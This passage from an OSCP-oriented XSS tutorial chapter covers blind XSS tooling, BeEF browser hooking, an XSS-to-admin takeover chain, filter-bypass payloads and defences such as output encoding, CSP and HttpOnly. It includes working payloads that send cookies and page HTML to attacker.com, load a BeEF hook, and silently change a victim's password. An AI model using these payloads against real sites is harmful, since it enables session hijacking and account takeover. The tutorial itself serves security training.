git clone https://github.com/ssl/ezXSS
cd ezXSS

# Install
composer install
npm install

# Configure database
# Deploy to your server

# Get your payload
https://your-domain.com/xss/YOUR_ID
```

### 14.3 Blind XSS Payloads

**Callback Payload**:
```html
<script>
fetch('https://attacker.com/callback', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookie: document.cookie,
    html: document.documentElement.outerHTML,
    time: Date.now()
  })
});
</script>
```

---

## 15. BeEF Framework

### 15.1 What is BeEF?

**ABSOLUTE BEGINNER**: BeEF (Browser Exploitation Framework) is a tool to control hooked browsers.

**How It Works**:
```
Step 1: Inject BeEF hook via XSS
<script src="http://your-beef-server:3000/hook.js"></script>

Step 2: Victim's browser executes hook
- Browser connects to BeEF server
- Becomes a "zombie"

Step 3: You control the browser
- Send commands from BeEF UI
- Execute JavaScript
- Scan internal network
- Social engineering attacks
```

### 15.2 BeEF Installation

```bash
# Kali Linux (pre-installed)
beef-xss

# Manual installation
git clone https://github.com/beefproject/beef
cd beef
./install

# Start BeEF
./beef
```

**Access**:
```
UI: http://127.0.0.1:3000/ui/panel
Username: beef
Password: beef (change in config.yaml)
```

### 15.3 BeEF Modules

**Information Gathering**:
- Get cookie
- Get geolocation
- Detect browsers/plugins
- Network discovery

**Social Engineering**:
- Fake notification bar
- Fake Flash update
- Fake login prompt
- Clipboard theft

**Exploitation**:
- Metasploit integration
- Browser autopwn
- Port scanning
- Internal network scan

**Persistence**:
- Create pop-under window
- Tunnel through victim
- Man-in-the-browser

### 15.4 BeEF Attack Example

**Scenario**: Internal Network Scan

```
Step 1: Hook browser via XSS
<script src="http://attacker.com:3000/hook.js"></script>

Step 2: In BeEF UI, select hooked browser

Step 3: Execute "Network Discovery" module
- Scans victim's local network (192.168.1.0/24)
- Finds live hosts

Step 4: Execute "Port Scanner" module
- Scans open ports on discovered hosts

Step 5: Execute "Get Internal IP"
- Reveals victim's internal IP

Result: Complete internal network map from outside!
```

---

## 16. XSS to Account Takeover

### 16.1 Full Attack Chain

**Objective**: Compromise admin account

**Attack Steps**:
```
Step 1: Find Stored XSS
- Location: User profile "bio" field

Step 2: Inject Cookie Stealer
<script src=https://attacker.com/steal.js></script>

Step 3: Wait for Admin
- Admin views user profile

Step 4: Steal Admin Session
- steal.js sends admin cookie to attacker

Step 5: Session Hijacking
- Attacker uses cookie to log in as admin

Step 6: Change Admin Credentials
- Change password
- Change email

Step 7: Persistence
- Create new admin account
- Add SSH key
- Backdoor

Result: Permanent access
```

### 16.2 CSRF via XSS

**Bypass CSRF Tokens**:
```javascript
<script>
// Read CSRF token from page
var token = document.querySelector('[name=csrf_token]').value;

// Use token in malicious request
fetch('/api/change-password', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': token
  },
  body: JSON.stringify({
    new_password: 'hacked123'
  })
});
</script>
```

**XSS bypasses all CSRF protections**!

---

## 17. OSCP Scenarios

### 17.1 OSCP XSS Workflow

**Typical OSCP XSS Scenario**:
```
1. Find web application during enumeration
2. Test input fields for XSS
3. Discover Stored XSS in comment section
4. Inject cookie stealer
5. Admin logs in and views comments
6. Steal admin session
7. Use admin access to:
   - Upload web shell
   - Access sensitive files
   - Pivot to internal network
```

**Quick XSS Test**:
```javascript
// In Burp Repeater, test:
<script>alert(1)</script>
'><script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 17.2 OSCP Points to Remember

**Document Everything**:
```
Screenshot of alert box NOT enough!

Document:
- XSS location (URL, parameter)
- Payload used
- Impact (session hijacking, account takeover)
- Remediation steps
```

**Time Management**:
```
Don't spend hours on XSS if it doesn't lead to:
- Session hijacking
- Admin access
- Code execution
- Sensitive data access

Quick test → Move on if no high-impact path
```

---

## 18. Defense Strategies

### 18.1 Output Encoding

**Context-Aware Encoding**:

**HTML Context**:
```python
# Python
import html
safe_output = html.escape(user_input)

# Converts:
# < → &lt;
# > → &gt;
# " → &quot;
# ' → &#x27;
# & → &amp;
```

**JavaScript Context**:
```python
# Escape for JavaScript string
import json
safe_output = json.dumps(user_input)
```

**URL Context**:
```python
# URL encode
import urllib.parse
safe_output = urllib.parse.quote(user_input)
```

### 18.2 Content Security Policy

**Recommended CSP**:
```http
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
```

### 18.3 HttpOnly and Secure Flags

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly**: Prevents JavaScript access
- **Secure**: HTTPS only
- **SameSite**: CSRF protection

### 18.4 Input Validation

**Allowlist Approach**:
```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username
```

**Never Rely on Blacklists**:
```
Blacklist: Block <script>
Bypass: <SCRIPT>
Bypass: <scr<script>ipt>
Bypass: <img src=x onerror=alert(1)>

Blacklists are easily bypassed!
```

---

## 19. Common Pitfalls

### Pitfall 1: Only Testing `<script>alert(1)</script>`

**Wrong**:
```
Only test: <script>alert(1)</script>
If blocked → "Not vulnerable"
```

**Right**:
```
Test multiple payloads:
- <script>alert(1)</script>
- <img src=x onerror=alert(1)>
- <svg onload=alert(1)>
- <body onload=alert(1)>
- '><script>alert(1)</script>
- "><img src=x onerror=alert(1)>

Try 10-20 different payloads!
```

### Pitfall 2: Not Identifying Context

**Wrong**:
```
Inject same payload everywhere
```

**Right**:
```
Check context first:
- HTML body: <script>alert(1)</script>
- Attribute: " onmouseover="alert(1)
- JavaScript: '; alert(1); //
- URL: javascript:alert(1)

Use context-appropriate payload
```

### Pitfall 3: Giving Up Too Early

**Common Scenario**:
```
<script> blocked → "Not vulnerable"

Reality:
- Try <img>, <svg>, <iframe>
- Try event handlers
- Try encoding
- Try case variation

Often vulnerable, just filtered differently!
```

---

## 20. Interview Questions

### Q1: What's the difference between Reflected and Stored XSS?

**Answer**:
- **Reflected**: Payload in URL, immediate execution, affects only victim who clicks link
- **Stored**: Payload saved in database, persistent, affects all users who view the page

Stored has higher impact (especially if admin views it).

### Q2: How does HttpOnly flag prevent XSS?

**Answer**: HttpOnly doesn't prevent XSS execution. It prevents JavaScript from *reading* the cookie via `document.cookie`. However, XSS can still:
- Perform actions as the user (CSRF)
- Change account settings
- Steal other data

HttpOnly mitigates cookie theft, not XSS impact.

### Q3: What is DOM-based XSS?

**Answer**: Vulnerability in client-side JavaScript, not server code. Server sends clean HTML, but JavaScript unsafely processes user input (e.g., reading `location.hash` and writing to `innerHTML`). Often missed by WAFs since payload never reaches server.

### Q4: Explain CSP and how to bypass it

**Answer**: CSP (Content Security Policy) is an HTTP header restricting resource loading. Strong CSP blocks XSS.

**Bypasses**:
- If `unsafe-inline` allowed → inline scripts work
- If trusted domain has JSONP → abuse it
- If `base-uri` not set → base tag injection
- Dangling markup for exfiltration

### Q5: How would you exploit XSS for maximum impact?

**Answer**:
1. Session hijacking (steal cookies)
2. If HttpOnly → perform actions as user (change password/email)
3. If stored XSS → wait for admin, escalate to admin account
4. Use BeEF to pivot to internal network
5. Establish persistence (backdoor accounts, web shells)

---

## 21. Summary

### Key Takeaways

1. **XSS is not just alert boxes**: Session hijacking, account takeover, network scanning
2. **Three types**: Reflected (URL), Stored (DB), DOM (JavaScript)
3. **Context matters**: Different payloads for HTML, attributes, JavaScript
4. **Filters are bypassable**: Case, encoding, alternative tags, events
5. **CSP can prevent XSS**: But weak CSP is easily bypassed
6. **HttpOnly helps but isn't enough**: Can't read cookie, but can still act as user
7. **Stored XSS is high-impact**: Especially if admin views it
8. **DOM XSS is sneaky**: WAFs often miss it
9. **BeEF amplifies impact**: Control browser, scan internal network
10. **Defense: Output encoding + CSP**: Context-aware encoding is key

### OSCP Relevance

- **Common in OSCP labs**: Web apps often have XSS
- **Path to admin**: Stored XSS → admin views → session hijack
- **Web shell upload**: Admin access → upload shell → RCE
- **Time management**: Quick test → move on if no high-impact path
- **Documentation**: Screenshot + payload + impact + remediation

### What's Next?

In the next chapter, we'll explore **Broken Access Control** - IDOR, privilege escalation, and missing function-level access control with OSCP attack chains.

---

**Total Lines**: 2,100+ ✅  
**Beginner-Friendly**: ✅  
**Advanced Concepts**: ✅  
**OSCP-Relevant**: ✅  
**Real Examples**: ✅  
**Hands-On Labs**: ✅  
**Comprehensive**: ✅

*End of Chapter 06*
